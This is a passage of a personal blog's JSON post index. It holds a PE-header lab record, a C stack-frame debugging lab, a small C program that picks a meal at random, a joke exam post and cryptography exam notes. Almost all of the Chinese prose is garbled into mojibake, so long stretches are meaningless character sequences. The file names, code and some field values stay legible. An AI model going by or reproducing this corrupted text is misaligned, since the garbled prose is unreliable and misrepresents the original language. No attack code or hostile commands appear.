¼å¯¹PEç»“æ„ä¸­å„ä¸ªç»“æ„ä½“å†…éƒ¨å­—æ®µå€¼è¿›è¡Œè®°å½•ï¼Œä¾‹å¦‚ï¼š 1. IMAGE_DOS_HEADER åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå 00000000 4D5A e_magic 0000003C B0000000 e_lfanew 2. IMAGE_FILE_HEADER åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå 000000B4 4C01 Machine 000000C6 0F01 Characteristics 3. IMAGE_OPTIONAL_HEADER åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå 000000C8 0B01 Magic 000001A6 0000 Size 4. IMAGE_DATA_DIRECTORYä¸­ä¸IMAGE_IMPORT_DESCRIPTORæœ‰å…³éƒ¨åˆ† åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå 00000128 0000 VirtualAddress 000001A6 0000 Size 5. IMAGE_SECTION_HEADER åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå 000001A8 2E746578 74000000 .text 00001D8h 146 VirtualSize 000001E0 200H SizeofRawdata 000001E4 600H PointerToRaeData 6. IMAGE_IMPORT_DESCRIPTOR åœ°å€ å€¼ï¼ˆå†…å­˜æ˜ åƒï¼‰ å­—æ®µå 00000610 Kernel32.dll Kernel32.dll 00000614 0 TimeDateStamp 00000618 0 ForwarderChain 0000061C 206A Name 00000620 2000 firstThunk","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"PE","slug":"PE","permalink":"https://gryffinbit.top/tags/PE/"}],"author":"Gryffinbit"},{"title":"Cè¯­è¨€ç¨‹åºä¸­å‡½æ•°è°ƒç”¨çš„åˆ†æ","slug":"Cè¯­è¨€ç¨‹åºä¸­å‡½æ•°è°ƒç”¨çš„åˆ†æ","date":"2021-05-14T08:25:58.000Z","updated":"2024-11-12T06:59:50.000Z","comments":true,"path":"2021/05/14/Cè¯­è¨€ç¨‹åºä¸­å‡½æ•°è°ƒç”¨çš„åˆ†æ/","permalink":"https://gryffinbit.top/2021/05/14/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E4%B8%AD%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90/","excerpt":"","text":"å®éªŒç›®çš„é€šè¿‡å¯¹Win32å¹³å°ä¸‹Cè¯­è¨€ç¨‹åºä¸­å‡½æ•°è°ƒç”¨çš„åˆ†æï¼Œç†Ÿç»ƒæŒæ¡Win32å¹³å°ä¸‹åˆ©äºæ ˆå¸§è¿›è¡Œå‡½æ•°å‚æ•°ä¼ é€’çš„æ–¹å¼ï¼Œä»¥åŠå‡½æ•°è°ƒç”¨ä¸è¿”å›è¿‡ç¨‹ã€‚ å®éªŒå†…å®¹123456789101112131415161718#include &quot;stdio.h&quot;long add(long *a, long *b)&#123;long *x, *y;x= a, y = b; return (*x + *y);&#125;int main(int argc, char* argv[])&#123; long a = 1, b = 2; printf(&quot;%d\\n&quot;, add(&amp;a, &amp;b)); return 0;&#125; å®éªŒè¦æ±‚ åœ¨VC2010ä¸­ï¼Œä½¿ç”¨releaseæ¨¡å¼ç¼–è¯‘ä¸Šè¿°æºç¨‹åºã€‚ åœ¨Win10ä¸‹ä½¿ç”¨Ollydbgè½¯ä»¶å¯¹ç¼–è¯‘åçš„æ‰§è¡Œç¨‹åºè¿›è¡ŒåŠ¨æ€è·Ÿè¸ªè°ƒè¯•ã€‚ è®°å½•main()å‡½æ•°å’Œadd()å‡½æ•°è¢«è°ƒç”¨æ—¶æ ˆå¸§çš„äº§ç”Ÿï¼Œä»¥åŠè°ƒç”¨ç»“æŸåæ ˆå¸§çš„æ’¤é”€è¿‡ å®éªŒç»“æœè¯·åœ¨æ­¤å¤„ç»˜åˆ¶æœ¬å®éªŒçš„æ ˆå¸§äº§ç”Ÿä¸æ’¤é”€è¿‡ç¨‹ï¼Œå¹¶ä¸”å¿…é¡»ä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œæ ‡æ³¨ODä¸­çš„çœŸå®åœ°å€ã€åœ°å€ä¸­ç›¸åº”å­˜æ”¾çš„16è¿›åˆ¶æ•°ï¼Œä»¥åŠæ ‡æ³¨EBPã€ESPçš„å€¼ã€‚","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[],"author":"Gryffinbit"},{"title":"å¸®ä½ å†³å®šåƒä»€ä¹ˆ","slug":"å¸®ä½ å†³å®šåƒä»€ä¹ˆ","date":"2021-05-12T10:21:53.000Z","updated":"2024-11-12T07:00:22.000Z","comments":true,"path":"2021/05/12/å¸®ä½ å†³å®šåƒä»€ä¹ˆ/","permalink":"https://gryffinbit.top/2021/05/12/%E5%B8%AE%E4%BD%A0%E5%86%B3%E5%AE%9A%E5%90%83%E4%BB%80%E4%B9%88/","excerpt":"","text":"æ¯åˆ°é¥­ç‚¹ï¼Œåˆåˆ°äº†ä¸–çºªéš¾é¢˜â€œä¸€ä¼šåƒä»€ä¹ˆï¼Ÿâ€äºæ˜¯ç”¨Cå†™äº†è¿™ä¸ªç®€å•çš„å°ä»£ç æ¥è§£å†³è¿™ä¸ªä¸–çºªéš¾é¢˜ã€‚ ä»£ç https://github.com/Gryffinbit/What_To_Eat è®¾è®¡æ€è·¯ typedef ä¸€ä¸ªç»“æ„ä½“Foodï¼Œæ•°æ®å…ƒç´ ä¸ºèœçš„IDï¼Œèœåï¼Œè¿™é“èœæ‰€å¤„åŒºåŸŸã€‚ void iterm()éœ€è¦æœ‰ä¸€ä¸ªèœå•å¯¼å…¥çš„åŠŸèƒ½ï¼ŒæŠŠå¯ä¾›é€‰æ‹©çš„èœæ”¾è¿›å»ã€‚ ç”¨åˆ°äº†fopen fscanf fcloseå‡½æ•°æ¥è¯»å–æ–‡ä»¶ã€‚å¯¼å…¥çš„èœå•ï¼Œæ ¼å¼è¦æ±‚ï¼Œç”¨ç©ºæ ¼æ¥éš”å¼€ä¸‰ä¸ªå…ƒç´ ã€‚è¯»å–æˆåŠŸåï¼Œå°†å†…å®¹åˆ†é—¨åˆ«ç±»çš„å­˜å…¥åˆ°ç»“æ„ä½“æ¯ä¸ªå…ƒç´ çš„æ•°ç»„ä¸­ void classify é€‰æ‹©å»å“ªåƒï¼Œä»¥ä¾¿åç»­æ ¹æ®é€‰æ‹©çš„åœ°ç‚¹ï¼Œæ¥ç­›é€‰å‡ºç¬¦åˆæ‰€åœ¨åœ°é™„è¿‘çš„èœã€‚ void avaliable()å†³å®šäº†å»å“ªé‡Œåƒä¹‹åï¼Œç­›é€‰å‡ºèœå•ä¸­ç¬¦åˆæ¡ä»¶çš„åœ°æ–¹ ç”¨åˆ°äº†strcmpæ¥å¯¹æ¯”ä¸¤ä¸ªæ•°ç»„ä¸­çš„å†…å®¹æ˜¯å¦ä¸€è‡´ã€‚è¾“å…¥çš„ä½ç½®å’Œèœå•ä¸­æŸäº›èœçš„ä½ç½®ä¸€è‡´ï¼Œåˆ™å°†ç¬¦åˆæ¡ä»¶èœçš„IDå­˜å…¥avali_i[ ]ç¬¦åˆæ¡ä»¶æ•°ç»„ã€‚av_numæ˜¯ç¬¦åˆæ¡ä»¶èœçš„æ•°é‡ã€‚ void generate(void) éšæœºæ•°ç”Ÿæˆï¼Œè®©ç”Ÿæˆçš„éšæœºæ•°æ¥å†³å®šåƒä»€ä¹ˆ void convert() å°†ç”Ÿæˆçš„éšæœºæ•°ï¼Œä¸èœåçš„IDç›¸å¯¹åº”ä¸Šï¼Œæ˜¾ç¤ºç»“æœçš„æ—¶å€™ï¼Œå°±åªæ˜¾ç¤ºèœå ç»“æœå±•ç¤º ä»£ç æ¡†æ¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;typedef struct Foods &#123; int id; char name[100]; char area[30]; //â€œåƒä»€ä¹ˆâ€æ—¶çš„æ‰€åœ¨åœ°&#125; Food;Food food[100];int g_i = 0; //ä»æ–‡ä»¶ä¸­è¯»å…¥çš„æ•°æ®ï¼Œå­˜å…¥æ•°ç»„int num; //char location[30]; //å»å“ªåƒint avali_i[50] = &#123;-1&#125;; //ç¬¦åˆå»å“ªåƒæ¡ä»¶çš„ï¼Œå°†èœåIDå­˜å…¥æ•°ç»„int av_num = 0; //ç¬¦åˆæ¡ä»¶çš„èœçš„æ•°é‡void iterm() &#123; //è¯»å…¥èœå•ï¼Œå¹¶å­˜å…¥æ•°ç»„ä»¥å¤‡åé¢ä½¿ç”¨ FILE* menu = fopen(&quot;/Users/gryffinbit/vscode_project/ç”Ÿæˆé£Ÿç‰©/menu.txt&quot;, &quot;r&quot;); .... fclose(menu);&#125;void classify() &#123; //é€‰æ‹©å»å“ªé‡Œåƒ .... scanf(&quot;%s&quot;, location);&#125;void avaliable() &#123;//å†³å®šäº†å»å“ªé‡Œåƒä¹‹åï¼Œç­›é€‰å‡ºèœå•ä¸­ç¬¦åˆæ¡ä»¶çš„åœ°æ–¹ ...&#125;void generate(void) &#123; //éšæœºæ•°ç”Ÿæˆ ...&#125;void convert() &#123; //å°†ç”Ÿæˆçš„éšæœºæ•°ï¼Œä¸èœåçš„IDç›¸å¯¹åº”ä¸Š .... printf(&quot;é‚£å°±å»åƒ â£ï¸ %s â£ï¸ å§ï¼\\n&quot;, food[g_i].name);&#125;int main() &#123; char confirm; iterm(); printf(&quot;å»å“ªåƒå‘¢ï¼Ÿ%s&quot;, location); printf(&quot;å¯ä»¥é€‰æ‹©çš„åœ°æ–¹ï¼šèŠ™è“‰é£Ÿå ‚é™„è¿‘ï¼Œåè¡—é™„è¿‘ï¼Œç½‘å®‰é™¢é™„è¿‘ï¼Œé¦™æ¨Ÿï¼Œä¸œè‹‘\\n&quot;); scanf(&quot;%s&quot;, location); avaliable(); while(1)&#123; generate(); convert(); printf(&quot;è¦ä¸è¦åƒè¿™ä¸ªèœå‘¢ï¼Ÿå†æ¥ä¸€æ¬¡å—ï¼Ÿ[Y/N] &quot;); scanf(&quot;%s&quot;,&amp;confirm); printf(&quot;----------------------ğŸ’™------------------------\\n&quot;); if(confirm==&#x27;N&#x27;) break; &#125; return 0;&#125; æ§è¯‰æƒå“¥å†™å®Œä»£ç ï¼ŒåŠŸèƒ½å®ç°æœ‰ç‚¹å°bugï¼Œäºæ˜¯å°±æ‰”ç»™æƒå“¥è°ƒè¯•äº†ã€‚å½“æ—¶å†™çš„æ—¶å€™ï¼Œå¾ˆç¢ç‰‡åŒ–ï¼Œæ€è·¯ä¹Ÿä¹±ä¸ƒå…«ç³Ÿï¼Œæƒ³åˆ°å“ªé‡ŒåŠ å“ªé‡Œï¼Œäºæ˜¯å˜é‡åï¼Œå…¨å±€å˜é‡éƒ½å®šä¹‰çš„ä¹±ä¸ƒå…«ç³Ÿçš„ã€‚çœ‹ç€ä»–è°ƒè¯•çš„æ—¶å€™ï¼Œæˆ‘å¯¹ç€ä»£ç éšå£æ¥äº†å¥ï¼Œä»€ä¹ˆç‹—å±ä»£ç ã€‚ äºæ˜¯ä»–è¯´ï¼šâ€œæ˜¯å•Šï¼Œè°å†™çš„å•Šï¼Œå“¦ï¼Œæˆ‘æ˜ç™½äº†ã€‚ç‹—æ‹‰çš„ä»£ç ï¼Œå°±å«ç‹—å±ä»£ç ã€‚â€ ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚é˜¿å‘¸ï¼Œæ¯æ—¥æ€è€ƒï¼Œè¿™æ ·çš„äººï¼Œä¸ºä»€ä¹ˆä¼šæœ‰å¥³æœ‹å‹å•Šã€‚","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"C","slug":"C","permalink":"https://gryffinbit.top/tags/C/"}],"author":"Gryffinbit"},{"title":"ã€è€ƒè¯•åŸå·ã€‘å¯†ç å­¦ã€è®¡ç»„ç­‰","slug":"ã€è€ƒè¯•åŸå·ã€‘å¯†ç å­¦ã€è®¡ç»„ç­‰","date":"2021-05-12T08:57:40.000Z","updated":"2024-11-12T07:00:23.000Z","comments":true,"path":"2021/05/12/ã€è€ƒè¯•åŸå·ã€‘å¯†ç å­¦ã€è®¡ç»„ç­‰/","permalink":"https://gryffinbit.top/2021/05/12/%E3%80%90%E8%80%83%E8%AF%95%E5%8E%9F%E5%8D%B7%E3%80%91%E5%AF%86%E7%A0%81%E5%AD%A6%E3%80%81%E8%AE%A1%E7%BB%84%E7%AD%89/","excerpt":"","text":"ä¸ä¼šå§ä¸ä¼šå§ï¼ŒçœŸçš„æœ‰äººç›¸ä¿¡ä¼šæœ‰è€ƒè¯•åŸå·å—ï¼Ÿ é†’é†’å§ï¼","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"å¯†ç å­¦è€ƒè¯•è®¡ç®—ç±»é¢˜å‹","slug":"å¯†ç å­¦è€ƒè¯•è®¡ç®—ç±»é¢˜å‹","date":"2021-05-10T16:34:55.000Z","updated":"2024-11-12T07:00:11.000Z","comments":true,"path":"2021/05/11/å¯†ç å­¦è€ƒè¯•è®¡ç®—ç±»é¢˜å‹/","permalink":"https://gryffinbit.top/2021/05/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%80%83%E8%AF%95%E8%AE%A1%E7%AE%97%E7%B1%BB%E9%A2%98%E5%9E%8B/","excerpt":"","text":"","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"å¯†ç å­¦è€ƒç‚¹","slug":"å¯†ç å­¦è€ƒç‚¹","date":"2021-05-10T15:25:36.000Z","updated":"2024-11-12T07:00:12.000Z","comments":true,"path":"2021/05/10/å¯†ç å­¦è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/05/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%80%83%E7%82%B9/","excerpt":"","text":"è€ƒç‚¹ç¬¬ä¸€ç«  âœ…ç”±å¯†é’¥Kå’Œå½“å‰çŠ¶æ€è¥¿æ ¼ç›ï¼Œç»„æˆå‡½æ•°fï¼ˆkï¼Œè¥¿æ ¼ç›ï¼‰ï¼Œæ¥äº§ç”Ÿä¸€ä¸ªå¯†é’¥æµã€‚ï¼ˆä¸æ˜æ–‡ã€å¯†æ–‡éƒ½æ— å…³ã€‚ï¼‰ è®¤è¯ä¸šåŠ¡ï¼šåœ¨å•å‘é€šä¿¡çš„æƒ…å†µä¸‹ï¼Œè®¤è¯ä¸šåŠ¡çš„åŠŸèƒ½æ˜¯ä½¿æ¥æ”¶è€…ç›¸ä¿¡æ¶ˆæ¯ç¡®å®æ˜¯ç”±å®ƒè‡ªå·±æ‰€å£°ç§°çš„é‚£ä¸ªä¿¡æºå‘å‡ºçš„ ä¿å¯†é€šä¿¡ç³»ç»Ÿæ¨¡å‹ï¼šåŒå¯†é’¥ä½“åˆ¶ä¸‹ï¼Œæ¥æ”¶æ–¹ç”±æœ¬åœ°å¯†é’¥å‘ç”Ÿå™¨è·å–è§£å¯†å¯†é’¥ ä»å®‰å…¨æ€§ä¸Šï¼Œå‡ ç±»ç®—æ³•çš„å¼ºåº¦æ’åºï¼šæŠ—å”¯å¯†æ–‡æ”»å‡»ç®—æ³•&lt;æŠ—å·²çŸ¥æ˜æ–‡æ”»å‡»ç®—æ³•&lt;æŠ—é€‰æ‹©æ˜æ–‡æ”»å‡»ç®—æ³•&lt;æŠ—é€‰æ‹©å¯†æ–‡æ”»å‡»ç®—æ³• ä¿å¯†ç³»ç»Ÿå¯¹ä¿¡æ¯ä¿å¯†éœ€è¦æ»¡è¶³ 1.æŠ—å¯†ç åˆ†æï¼Œæ•Œæ‰‹å†³å®šå¯†é’¥æˆ–ä»»æ„æ˜æ–‡åœ¨è®¡ç®—ä¸Šä¸å¯è¡Œ 2.ä¾èµ–äºå¯†é’¥ï¼Œä¸ä¾èµ–ç®—æ³• 3.åŠ å¯†å’Œè§£å¯†ç®—æ³•é€‚ç”¨äºå¯†é’¥ç©ºé—´æ‰€æœ‰å…ƒç´  ç³»ç»Ÿä¾¿äºå®ç°å’Œä½¿ç”¨ã€‚ å¯†ç ç³»ç»ŸåŸºæœ¬è¦ç´  1.æ˜æ–‡ 2.å¯†æ–‡ 3.åŠ å¯† 4.è§£å¯† 5.åŠ å¯†ç®—æ³•ã€è§£å¯†ç®—æ³• 6.å¯†é’¥ã€‚ å¯†é’¥æ˜¯ä½“åˆ¶å®‰å…¨ä¿å¯†çš„å…³é”® å¯†ç åˆ†æå­¦ ä»å¯†æ–‡åˆ†æå‡ºï¼šæ˜æ–‡ã€å¯†é’¥ã€è§£å¯†ç®—æ³• å¯¹ç§°å¯†ç ä½“åˆ¶ï¼š æœ¬è´¨ä¸Šï¼ŒåŠ å¯†ä¸è§£å¯†å¯†é’¥ç›¸åŒï¼Œä½†æ˜¯å½¢å¼ä¸Šï¼Œå¯ä»¥ä¸æ˜¯å®Œå…¨ä¸€æ ·çš„å¯†é’¥ ä»£æ¢å¯†ç ã€ç½®æ¢å¯†ç åŒºåˆ«ï¼š ä»£æ¢å¯†ç è¦å…ˆå»ºç«‹ä¸€ä¸ªæ›¿æ¢è¡¨ï¼ˆå³å¯†é’¥ï¼‰ï¼ŒåŠ å¯†æ—¶å°†éœ€è¦åŠ å¯†çš„æ˜æ–‡ä¾æ¬¡é€šè¿‡æŸ¥è¡¨ï¼Œæ›¿æ¢ä¸ºç›¸åº”çš„å­—ç¬¦ï¼Œæ˜æ–‡å­—ç¬¦è¢«é€ä¸ªæ›¿æ¢åï¼Œç”Ÿæˆæ— ä»»ä½•æ„ä¹‰çš„å­—ç¬¦ä¸²ï¼Œå³å¯†æ–‡ã€‚ ç½®æ¢å¯†ç æ˜¯å¯¹æ˜æ–‡å­—ç¬¦æŒ‰æŸç§è§„å¾‹è¿›è¡Œä½ç½®çš„ç½®æ¢ã€‚ æ£‹ç›˜å¯†ç ã€å‡¯æ’’å¯†ç ã€ç»´å‰å°¼äºšå¯†ç éƒ½æ˜¯ä»£æ¢å¯†ç ã€‚ å¤©ä¹¦å¯†ç æ˜¯ç½®æ¢å¯†ç ã€‚ ç¬¬ä¸€ä¸ªå•†ç”¨çº§åˆ«å¯†ç æ ‡å‡†æ˜¯DES ç¬¬äºŒç«  â»1.ç†è§£æµå¯†ç çš„æ¦‚å¿µã€å¯†é’¥æµçš„ä¼ªéšæœºæ€§å’Œç”Ÿæˆå™¨çš„ç»“æ„ã€‚æµå¯†ç è¿è¡Œæ–¹å¼ã€‚ 2.ç†è§£m-åºåˆ—åŸºæœ¬æ¦‚å¿µå’Œç‰¹ç‚¹ã€‚m-åºåˆ—å‘¨æœŸ å¯†é’¥æµç”Ÿæˆå™¨çš„é©±åŠ¨ 1.ä¸ºäº†æŠ—å¯†ç åˆ†æï¼Œæ‰€ä»¥è¦æ±‚å‡½æ•°è®¾è®¡æ˜¯éçº¿æ€§çš„ã€‚ä½†æ˜¯çŠ¶æ€å‡½æ•°çš„è¾“å…¥ï¼Œéçº¿æ€§çš„éš¾ä»¥æ“ä½œå®ç°ã€‚äºæ˜¯ç”±ä¸¤éƒ¨åˆ†ç»„æˆã€‚çº¿æ€§çš„çŠ¶æ€è¾“å…¥+éçº¿æ€§çš„å¯†é’¥è¾“å‡ºã€‚æ‰€ä»¥æ•´ä½“è¿˜æ˜¯éçº¿æ€§çš„ã€‚ 2.æå¤§å‘¨æœŸã€è‰¯å¥½çš„ç»Ÿè®¡ç‰¹æ€§ã€æŠ—çº¿æ€§åˆ†æã€æŠ—ç»Ÿè®¡åˆ†æ åŠ å¯†å™¨ åŠ å¯†å™¨å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šå¯†é’¥æµäº§ç”Ÿå™¨+åŠ å¯†å˜æ¢å™¨ ç”Ÿæˆå™¨ï¼Œæµå¯†ç çš„äº§ç”Ÿ ä¸çŠ¶æ€æœ‰å…³ï¼Œæœ‰è®°å¿†å…ƒä»¶ï¼Œä¸€ä¸ªä¸ªè¾“å‡ºï¼Œæ¯æ¬¡çš„kè¦å˜ã€‚ ä¼ªéšæœºæ•° éšæœºæ€§ï¼š ä¸€èˆ¬è®¤ä¸ºéšæœºåºåˆ—åº”æœ‰è‰¯å¥½çš„ç»Ÿè®¡ç‰¹æ€§ã€‚åˆ†å¸ƒå‡åŒ€æ€§ï¼šåºåˆ—ä¸­çš„ä½åˆ†å¸ƒåº”æ˜¯å‡åŒ€çš„ï¼Œå³0å’Œ1å‡ºç°çš„é¢‘ç‡å¤§çº¦ç›¸ç­‰ã€‚ ç‹¬ç«‹æ€§ï¼š åºåˆ—ä¸­ä»»ä½•å­åºåˆ—ä¸èƒ½ç”±å…¶ä»–å­åºåˆ—æ¨å¯¼å‡ºã€‚ ä¸ºä»€ä¹ˆå«ä¼ªéšæœºï¼š å¯†é’¥æµæ˜¯å‘¨æœŸçš„ï¼ˆä¸èƒ½åšåˆ°ä¸€æ¬¡ä¸€å¯†ï¼Œå¯†é’¥æ²¡æœ‰é‚£ä¹ˆå¤šï¼‰ï¼Œåºåˆ—ä¸å¯èƒ½åšåˆ°å®Œå…¨éšæœºã€‚ å¯†ç åº”ç”¨å¤§å¤šä½¿ç”¨ç®—æ³•æ¥ç”Ÿæˆéšæœºæ•°ã€‚è¿™äº›ç®—æ³•æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥äº§ç”Ÿçš„åºåˆ—å¹¶éç»Ÿè®¡éšæœºçš„ã€‚ åªèƒ½è¦æ±‚æˆªè·æ¯”å‘¨æœŸçŸ­çš„ä¸€æ®µæ—¶ï¼Œä¸ä¼šæ³„éœ²æ›´å¤šä¿¡æ¯ã€‚ éœ€è¦æ»¡è¶³ï¼š å‘¨æœŸè¦å¤§ã€‚æˆªè·éƒ¨åˆ†æ˜æ–‡å’Œç›¸åº”å¯†æ–‡ä¸èƒ½æ¨å‡ºæ•´ä¸ªåºåˆ—ã€‚åºåˆ—è®¡ç®—å®¹æ˜“ã€‚ måºåˆ—ï¼š 0ã€1å‡ºç°çš„æ¦‚ç‡å¤§è‡´ç›¸åŒï¼Œåªå·®ä¸€ä¸ªã€‚ï¼ˆå°‘ä¸€ä¸ª1ï¼‰ æ€»æ¸¸ç¨‹æ•°ä¸º2^{n-1} 0ã€1åœ¨åºåˆ—çš„æ¯ä¸€ä¸ªä½ç½®ä¸Šå‡ºç°çš„æ¦‚ç‡ç›¸åŒã€‚ ç ´è¯‘ï¼šå·²çŸ¥ä¸€ä¸ª2né•¿çš„æ˜æ–‡å¯†æ–‡å¯¹ï¼Œå¯ä»¥æ±‚å‡º2né•¿çš„å¯†é’¥åºåˆ—ã€‚æ¨å‡ºçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨çš„n+1ä¸ªçŠ¶æ€ å¼‚è‡ªç›¸å…³å‡½æ•°æ˜¯ä¸€ä¸ªå¸¸æ•°ï¼Œè¡¨æ˜å¹³ç§»åºåˆ—æ— æ³•æˆ–å¾—æ›´å¤šä¿¡æ¯ ç¬¬ä¸‰ç«  åˆ†ç»„å¯†ç  â» ç†è§£æ•°æ®åŠ å¯†æ ‡å‡†DESçš„è®¾è®¡æ€æƒ³å’Œæ¡†æ¶ã€‚ç³»ç»Ÿè®¾è®¡åŸºæœ¬æ–¹æ³• æŒæ¡DESç®—æ³•çš„å®‰å…¨æ€§å’Œå…¸å‹çš„è½®å‡½æ•°ç»“æ„Feistelã€‚ç©ºï¼›Sç›’å‚æ•°ç‰¹è´¨ã€‚Sç›’æ¼”ç¤º æŒæ¡é«˜çº§åŠ å¯†æ ‡å‡†AESç®—æ³•è½®å‡½æ•°æ‰€éœ€çš„æœ‰é™åŸŸçŸ¥è¯†ã€‚ç©ºï¼›ç©ºï¼›ä¸å¯çº¦å¤šé¡¹å¼ï¼Œä½æ“ä½œå¿«é€Ÿè®¡ç®— ç†è§£AESè½®å‡½æ•°ç»“æ„å’Œå®‰å…¨æ€§ã€‚ç©ºï¼›è½®å‡½æ•°æ„æˆï¼ˆæ¸…æ¥šå“ªå‡ éƒ¨åˆ†ï¼‰ è®¾è®¡å…³é”®ï¼š å…³é”®åœ¨äºåŠ è§£å¯†ç®—æ³•ï¼Œè¦æ±‚æ˜æ–‡å’Œå¯†æ–‡ä¹‹é—´çš„å…³è”åœ¨å¯†é’¥çš„æ§åˆ¶ä¸‹ï¼Œå°½å¯èƒ½å¤æ‚ 1977å¹´ï¼Œæ•°æ®åŠ å¯†æ ‡å‡†DESåœ¨ç¾å›½æ‰¹å‡†ã€‚å®ƒåŸºäºç¾å›½IBMå…¬å¸æå‡ºçš„Lucifer å¯†ç ï¼Œæ˜¯ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªå¹¿æ³›çš„å•†ä¸šæ•°æ®ä¿å¯†ç®—æ³• DESçš„è½®å‡½æ•°å°†32æ¯”ç‰¹çš„R{i-1}è¾“å…¥ï¼Œç»è¿‡æ‰©å±•ç½®æ¢å˜æˆ48æ¯”ç‰¹ï¼Œæ‰ä¸è½®å¯†é’¥Ki å¼‚æˆ–ã€‚è€Œåéœ€è¦ç»è¿‡Sç›’ä»£æ¢ï¼Œå˜æˆ32æ¯”ç‰¹ï¼Œå†è¿›ç¨‹ä¸€æ¬¡Pç½®æ¢ã€‚ AESç®—æ³•ä¸ºæŠµæŠ—çº¿æ€§å¯†ç åˆ†æå’Œå·®åˆ†å¯†ç åˆ†æï¼Œè®¾è®¡çš„è½®å‡½æ•°åˆ†ä¸ºï¼šçº¿æ€§æ··åˆå±‚ï¼ˆé«˜åº¦æ‰©æ•£ï¼‰ã€éçº¿æ€§æ··åˆå±‚ï¼ˆSç›’ï¼‰ã€å¯†é’¥åŠ å±‚ï¼ˆå­å¯†é’¥å’ŒçŠ¶æ€å¼‚æˆ–ï¼‰ AESï¼Œè¡Œç§»ä½ä¸­ï¼Œç¬¬0è¡Œä¸ç§»ä½ã€‚å…¶ä»–è¡Œæ ¹æ®ä¸åŒçŠ¶æ€ï¼Œä¸åŒåˆ†ç»„æ•°Nbï¼Œä½ç§»é‡ä¸åŒ AESï¼Œåˆ—æ··æ·†ä¸­ã€‚çŠ¶æ€é˜µåˆ—çš„æ¯ä¸ªåˆ—è§†ä¸ºGFï¼ˆ2^8ï¼‰ä¸Šçš„å¤šé¡¹å¼ï¼Œå†ä¸å›ºå®šå¤šé¡¹å¼cï¼ˆXï¼‰è¿›è¡Œæ¨¡x^4 +1ä¹˜æ³•ã€‚c(x)æ˜¯æ¨¡x^4 +1å¯é€†çš„å¤šé¡¹å¼ï¼ˆå¯çº¦å¤šé¡¹å¼ï¼‰ã€‚æ‰€ä»¥åˆ—æ··åˆæ˜¯å¯é€†çš„ æ‰©å±•å¯†é’¥ï¼Œçœ‹ä½œæ˜¯ä»¥å­—ï¼ˆ4å­—èŠ‚ï¼‰ä¸ºå…ƒç´ çš„ä¸€ç»´æ•°ç»„ ç¬¬å››ç«  å…¬é’¥å¯†ç å­¦ â» ç†è§£å…¬é’¥å¯†ç çš„ä½“åˆ¶å’ŒåŸºæœ¬æ¦‚å¿µã€‚ç»„æˆä¸Šç‰¹ç‚¹ã€‚åŠŸèƒ½ä¸ŠåŒºåˆ«ã€‚ æŒæ¡å‰©ä½™ç³»çš„åŸºæœ¬æ¦‚å¿µã€è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç† æŒæ¡RSAåŠ å¯†ç®—æ³•å’Œé¢„å¤„ç†è®¡ç®—ã€‚ç©ºï¼›ç©ºï¼›ç©ºï¼›è®¡ç®— ç†è§£RSAç®—æ³•åŸºäºå¤§æ•´æ•°éš¾åˆ†è§£çš„å®‰å…¨æ€§ã€‚ç©ºã€å›°éš¾é—®é¢˜ã€å®‰å…¨æ€§ æŒæ¡ElGamalåŠ å¯†ç®—æ³•å’ŒåŸºäºç¦»æ•£å¯¹æ•°æ±‚è§£å›°éš¾æ€§çš„å®‰å…¨æ€§ã€‚ç©ºï¼›ç»„æˆï¼Œå›°éš¾é—®é¢˜ï¼Œå®‰å…¨æ€§ã€‚ç©ºï¼›è®¡ç®—ï¼Œéšæœºæ•°éšæ‚£ã€‚ äº†è§£å®æ•°åŸŸä¸Šæ¤­åœ†æ›²çº¿æ€§è´¨ã€‚ç©ºï¼›è¿ç®—çš„ä»£æ•°ä¸å‡ ä½•è¡¨ç¤º 